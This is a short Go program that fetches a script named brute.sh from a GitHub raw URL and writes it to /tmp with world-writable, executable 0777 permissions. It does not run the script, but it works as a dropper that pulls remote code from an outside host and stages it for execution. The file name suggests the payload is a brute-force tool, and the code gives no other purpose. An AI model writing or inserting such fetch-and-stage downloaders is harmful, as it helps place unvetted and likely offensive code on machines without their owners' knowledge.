
package main



import (


"net/http"
"io/ioutil"

)




//downlod for brute.sh



//func down_brute() {


func  main() {



//function no critical





cli := http.Client{}


resp , err_get := cli.Get("https://github.com/atilabyte/golang/raw/refs/heads/master/brute.sh")


 if err_get != nil {


  //erro no github.com 

          return

   }



script  , err_readall :=  ioutil.ReadAll(resp.Body) 

   if err_readall  != nil  {


       //"erro em readall"


           return 


            }




ioutil.WriteFile("/tmp/brute.sh" , script , 0777 )





}











